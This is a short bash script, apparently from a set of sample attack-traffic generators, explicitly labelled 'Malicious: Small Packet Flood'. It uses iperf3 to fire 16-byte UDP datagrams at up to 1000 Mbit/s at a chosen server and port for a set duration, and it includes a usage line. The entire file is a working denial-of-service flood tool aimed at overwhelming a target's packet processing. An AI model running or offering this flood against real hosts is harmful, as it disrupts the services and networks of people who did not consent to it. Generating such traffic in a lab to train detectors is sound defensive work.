#!/bin/bash
# Malicious: Small Packet Flood - send minimal payload packets at maximum rate
# Usage: ./small_packet_flood.sh <server_ip> [port] [duration_sec] [bandwidth]
SERVER=${1:-127.0.0.1}
PORT=${2:-5201}
DURATION=${3:-60}
BANDWIDTH=${4:-1000M}
# Use very small datagram to overwhelm processing
iperf3 -c "$SERVER" -p "$PORT" -u -b "$BANDWIDTH" -l 16 -t "$DURATION"
